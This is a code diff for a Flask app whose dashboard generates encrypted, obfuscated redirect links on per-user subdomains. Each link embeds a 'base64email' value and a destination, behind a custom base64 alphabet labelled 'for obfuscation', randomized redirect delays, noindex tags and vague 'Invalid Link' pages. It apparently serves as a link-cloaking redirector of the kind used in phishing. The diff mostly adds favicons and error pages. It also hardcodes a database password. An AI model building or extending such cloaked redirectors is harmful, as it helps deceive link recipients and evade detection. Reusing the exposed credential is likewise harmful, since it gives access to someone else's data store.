@@ -1,4 +1,3 @@
-```python
 from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify
 from flask_wtf import FlaskForm, CSRFProtect
 from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
@@ -47,6 +46,7 @@ VALKEY_USERNAME = "default"
 VALKEY_PASSWORD = "AVNS_Yzfa75IOznjCrZJIyzI"
 DATA_RETENTION_DAYS = 90
 USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
+FAVICON_URL = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/favicon.ico"
 
 # Custom base64 alphabet for obfuscation
 CUSTOM_B64_ALPHABET = 'QWERtyuiopASDFghjklZXCvbnm1234567890_-+='
@@ -109,12 +109,12 @@ class GenerateURLForm(FlaskForm):
     ])
     randomstring1 = StringField('Randomstring1', validators=[
         DataRequired(message="Randomstring1 is required"),
-        Length(min=30, max=30, message="Randomstring1 must be 30 characters"),
+        Length(min=2, max=30, message="Randomstring1 must be 2-30 characters"),
         Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring1 can only contain letters, numbers, _, @, or .")
     ])
     base64email = StringField('Base64email', validators=[
         DataRequired(message="Base64email is required"),
-        Length(min=30, max=30, message="Base64email must be 30 characters"),
+        Length(min=2, max=30, message="Base64email must be 2-30 characters"),
         Regexp(r'^[A-Za-z0-9_@.]+$', message="Base64email can only contain letters, numbers, _, @, or .")
     ])
     destination_link = StringField('Destination Link', validators=[
@@ -123,7 +123,7 @@ class GenerateURLForm(FlaskForm):
     ])
     randomstring2 = StringField('Randomstring2', validators=[
         DataRequired(message="Randomstring2 is required"),
-        Length(min=30, max=30, message="Randomstring2 must be 30 characters"),
+        Length(min=2, max=30, message="Randomstring2 must be 2-30 characters"),
         Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
     ])
     expiry = SelectField('Expiry', choices=[
@@ -205,6 +205,7 @@ def rate_limit(limit=3, per=60):
                             <meta charset="UTF-8">
                             <meta name="viewport" content="width=device-width, initial-scale=1.0">
                             <title>429 Too Many Requests</title>
+                            <link rel="icon" href="{{ favicon_url }}">
                             <script src="https://cdn.tailwindcss.com"></script>
                         </head>
                         <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -214,7 +215,7 @@ def rate_limit(limit=3, per=60):
                             </div>
                         </body>
                         </html>
-                    """), 429
+                    """, favicon_url=FAVICON_URL), 429
                 else:
                     valkey_client.incr(key)
                     logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit} on {f.__name__}")
@@ -228,7 +229,7 @@ def rate_limit(limit=3, per=60):
 def encrypt_aes_gcm(payload, endpoint):
     try:
         # Derive dynamic key from endpoint
-        dynamic_key = hashlib.sha256(AES_GCM_KEY + endpoint.encode()).digest()
+        dynamic_key = hashlib.sha256(AES_GCM_KEY + endpoint.encode('utf-8')).digest()
         iv = secrets.token_bytes(12)
         cipher = Cipher(algorithms.AES(dynamic_key), modes.GCM(iv), backend=default_backend())
         encryptor = cipher.encryptor()
@@ -246,7 +247,7 @@ def encrypt_aes_gcm(payload, endpoint):
 def decrypt_aes_gcm(encrypted, endpoint):
     try:
         # Derive dynamic key from endpoint
-        dynamic_key = hashlib.sha256(AES_GCM_KEY + endpoint.encode()).digest()
+        dynamic_key = hashlib.sha256(AES_GCM_KEY + endpoint.encode('utf-8')).digest()
         parts = encrypted.split('.')
         if len(parts) < 1:
             raise ValueError("Invalid payload format")
@@ -267,7 +268,7 @@ def decrypt_aes_gcm(encrypted, endpoint):
 def encrypt_hmac_sha256(payload, endpoint):
     try:
         # Derive dynamic key from endpoint
-        dynamic_key = hashlib.sha256(HMAC_KEY + endpoint.encode()).digest()
+        dynamic_key = hashlib.sha256(HMAC_KEY + endpoint.encode('utf-8')).digest()
         data = payload.encode('utf-8')
         h = hmac.HMAC(dynamic_key, hashes.SHA256(), backend=default_backend())
         h.update(data)
@@ -283,7 +284,7 @@ def encrypt_hmac_sha256(payload, endpoint):
 def decrypt_hmac_sha256(encrypted, endpoint):
     try:
         # Derive dynamic key from endpoint
-        dynamic_key = hashlib.sha256(HMAC_KEY + endpoint.encode()).digest()
+        dynamic_key = hashlib.sha256(HMAC_KEY + endpoint.encode('utf-8')).digest()
         parts = encrypted.split('.')
         if len(parts) < 3:
             raise ValueError("Invalid payload format")
@@ -307,7 +308,7 @@ def get_valid_usernames():
             if cached:
                 logger.debug("Retrieved usernames from Valkey cache")
                 return json.loads(cached)
-        response = requests.get(USER_TXT_URL)
+        response = requests.get(USER_TXT_URL, timeout=5)
         response.raise_for_status()
         usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
         if valkey_client:
@@ -384,6 +385,7 @@ def login():
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <meta name="robots" content="noindex, nofollow">
                 <title>Login</title>
+                <link rel="icon" href="{{ favicon_url }}">
                 <script src="https://cdn.tailwindcss.com"></script>
                 <style>
                     body { background: linear-gradient(to right, #4f46e5, #7c3aed); }
@@ -415,7 +417,7 @@ def login():
                 </div>
             </body>
             </html>
-        """, form=form)
+        """, form=form, favicon_url=FAVICON_URL)
     except Exception as e:
         logger.error(f"Error in login: {str(e)}", exc_info=True)
         return render_template_string("""
@@ -425,6 +427,7 @@ def login():
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Internal Server Error</title>
+                <link rel="icon" href="{{ favicon_url }}">
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -434,7 +437,7 @@ def login():
                 </div>
             </body>
             </html>
-        """), 500
+        """, favicon_url=FAVICON_URL), 500
 
 @app.route("/", methods=["GET"])
 @rate_limit(limit=3, per=60)
@@ -455,6 +458,7 @@ def index():
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Internal Server Error</title>
+                <link rel="icon" href="{{ favicon_url }}">
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -464,7 +468,7 @@ def index():
                 </div>
             </body>
             </html>
-        """), 500
+        """, favicon_url=FAVICON_URL), 500
 
 @app.route("/dashboard", methods=["GET", "POST"])
 @login_required
@@ -516,7 +520,7 @@ def dashboard():
 
                 if not error:
                     generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
-                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
+                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode('utf-8')).hexdigest()
                     if valkey_client:
                         try:
                             valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
@@ -575,7 +579,7 @@ def dashboard():
             logger.warning("Valkey unavailable, cannot fetch URLs")
             valkey_error = "Database unavailable"
 
-        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
+        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode('utf-8')).hexdigest()[:6]
         primary_color = f"#{theme_seed}"
 
         logger.debug(f"Rendering dashboard for user: {username}")
@@ -587,6 +591,7 @@ def dashboard():
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <meta name="robots" content="noindex, nofollow">
                 <title>Dashboard - {{ username }}</title>
+                <link rel="icon" href="{{ favicon_url }}">
                 <script src="https://cdn.tailwindcss.com"></script>
                 <style>
                     body { background: linear-gradient(to right, #4f46e5, #7c3aed); color: #1f2937; }
@@ -710,7 +715,7 @@ def dashboard():
                 </div>
             </body>
             </html>
-        """, username=username, form=form, urls=urls, primary_color=primary_color, error=error, valkey_error=valkey_error)
+        """, username=username, form=form, urls=urls, primary_color=primary_color, error=error, valkey_error=valkey_error, favicon_url=FAVICON_URL)
     except Exception as e:
         logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
         return render_template_string("""
@@ -720,6 +725,7 @@ def dashboard():
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Internal Server Error</title>
+                <link rel="icon" href="{{ favicon_url }}">
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -730,7 +736,7 @@ def dashboard():
                 </div>
             </body>
             </html>
-        """, error=str(e)), 500
+        """, favicon_url=FAVICON_URL, error=str(e)), 500
 
 @app.route("/toggle_analytics/<url_id>", methods=["POST"])
 @login_required
@@ -788,6 +794,7 @@ def delete_url(url_id):
                     <meta charset="UTF-8">
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <title>Error</title>
+                    <link rel="icon" href="{{ favicon_url }}">
                     <script src="https://cdn.tailwindcss.com"></script>
                 </head>
                 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -797,7 +804,7 @@ def delete_url(url_id):
                     </div>
                 </body>
                 </html>
-            """), 500
+            """, favicon_url=FAVICON_URL), 500
     except Exception as e:
         logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
         return render_template_string("""
@@ -807,6 +814,7 @@ def delete_url(url_id):
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Internal Server Error</title>
+                <link rel="icon" href="{{ favicon_url }}">
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -816,7 +824,7 @@ def delete_url(url_id):
                 </div>
             </body>
             </html>
-        """), 500
+        """, favicon_url=FAVICON_URL), 500
 
 @app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
 @rate_limit(limit=3, per=60)
@@ -827,7 +835,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                      f"encrypted_payload={encrypted_payload[:20]}..., path_segment={path_segment}, "
                      f"IP={request.remote_addr}, URL={request.url}")
 
-        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
+        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode('utf-8')).hexdigest()
 
         # Randomized Redirect Delay
         delay = random.uniform(0.1, 0.5)
@@ -849,7 +857,24 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
         except Exception as e:
             logger.error(f"Error decoding encrypted_payload: {str(e)}", exc_info=True)
-            abort(400, "Invalid payload format")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Invalid Link</title>
+                    <link rel="icon" href="{{ favicon_url }}">
+                    <script src="https://cdn.tailwindcss.com"></script>
+                </head>
+                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
+                        <p class="text-gray-600">The link is invalid or has expired. Please contact support.</p>
+                    </div>
+                </body>
+                </html>
+            """, favicon_url=FAVICON_URL), 400
 
         # Clean path_segment by removing UUID suffix
         uuid_suffix_pattern = r'(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[0-9a-f]+)?$'
@@ -898,6 +923,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     <meta charset="UTF-8">
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <title>Invalid Link</title>
+                    <link rel="icon" href="{{ favicon_url }}">
                     <script src="https://cdn.tailwindcss.com"></script>
                 </head>
                 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -907,7 +933,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     </div>
                 </body>
                 </html>
-            """), 400
+            """, favicon_url=FAVICON_URL), 400
 
         try:
             data = json.loads(payload)
@@ -915,16 +941,67 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             expiry = data.get("expiry", float('inf'))
             if not redirect_url or not re.match(r"^https?://", redirect_url):
                 logger.error(f"Invalid redirect URL: {redirect_url}")
-                abort(400, "Invalid redirect URL")
+                return render_template_string("""
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Invalid Link</title>
+                        <link rel="icon" href="{{ favicon_url }}">
+                        <script src="https://cdn.tailwindcss.com"></script>
+                    </head>
+                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                            <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
+                            <p class="text-gray-600">The link is invalid or has expired. Please contact support.</p>
+                        </div>
+                    </body>
+                    </html>
+                """, favicon_url=FAVICON_URL), 400
             if time.time() > expiry:
                 logger.warning("URL expired")
                 if valkey_client:
                     valkey_client.delete(f"url_payload:{url_id}")
-                abort(410, "URL has expired")
+                return render_template_string("""
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Link Expired</title>
+                        <link rel="icon" href="{{ favicon_url }}">
+                        <script src="https://cdn.tailwindcss.com"></script>
+                    </head>
+                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                            <h3 class="text-lg font-bold mb-4 text-red-600">Link Expired</h3>
+                            <p class="text-gray-600">This link has expired. Please generate a new one.</p>
+                        </div>
+                    </body>
+                    </html>
+                """, favicon_url=FAVICON_URL), 410
             logger.debug(f"Parsed payload: redirect_url={redirect_url}")
         except Exception as e:
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
-            abort(400, "Invalid payload")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Invalid Link</title>
+                    <link rel="icon" href="{{ favicon_url }}">
+                    <script src="https://cdn.tailwindcss.com"></script>
+                </head>
+                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
+                        <p class="text-gray-600">The link is invalid or has expired. Please contact support.</p>
+                    </div>
+                </body>
+                </html>
+            """, favicon_url=FAVICON_URL), 400
 
         final_url = f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}"
         logger.info(f"Redirecting to {final_url}")
@@ -938,6 +1015,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Internal Server Error</title>
+                <link rel="icon" href="{{ favicon_url }}">
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -948,7 +1026,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 </div>
             </body>
             </html>
-        """, error=str(e)), 500
+        """, favicon_url=FAVICON_URL, error=str(e)), 500
 
 @app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
 @rate_limit(limit=3, per=60)
@@ -969,6 +1047,7 @@ def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Internal Server Error</title>
+                <link rel="icon" href="{{ favicon_url }}">
                 <script src="https://cdn.tailwindcss.com"></script>
             </head>
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -979,30 +1058,53 @@ def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
                 </div>
             </body>
             </html>
-        """, error=str(e)), 500
+        """, favicon_url=FAVICON_URL, error=str(e)), 500
 
 @app.route("/<path:path>", methods=["GET"])
 @rate_limit(limit=3, per=60)
 def catch_all(path):
-    logger.warning(f"404 Not Found for path: {path}, host: {request.host}, url: {request.url}")
-    return render_template_string("""
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Not Found</title>
-            <script src="https://cdn.tailwindcss.com"></script>
-        </head>
-        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
-                <p class="text-gray-600">The requested URL was not found on the server.</p>
-                <p class="text-gray-600">Please check your spelling and try again.</p>
-            </div>
-        </body>
-        </html>
-    """), 404
+    try:
+        logger.warning(f"404 Not Found for path: {path}, host: {request.host}, url: {request.url}")
+        return render_template_string("""
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Not Found</title>
+                <link rel="icon" href="{{ favicon_url }}">
+                <script src="https://cdn.tailwindcss.com"></script>
+            </head>
+            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
+                    <p class="text-gray-600">The requested URL was not found on the server.</p>
+                    <p class="text-gray-600">Please check your spelling and try again.</p>
+                </div>
+            </body>
+            </html>
+        """, favicon_url=FAVICON_URL), 404
+    except Exception as e:
+        logger.error(f"Error in catch_all: {str(e)}", exc_info=True)
+        return render_template_string("""
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Internal Server Error</title>
+                <link rel="icon" href="{{ favicon_url }}">
+                <script src="https://cdn.tailwindcss.com"></script>
+            </head>
+            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
+                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
+                    <p class="text-gray-600">Please try again later or contact support.</p>
+                </div>
+            </body>
+            </html>
+        """, favicon_url=FAVICON_URL, error=str(e)), 500
 
 def generate_random_string(length):
     try:
@@ -1021,4 +1123,3 @@ if __name__ == "__main__":
         logger.error(f"Error starting Flask app: {str(e)}", exc_info=True)
         import sys
         sys.exit(1)
-```
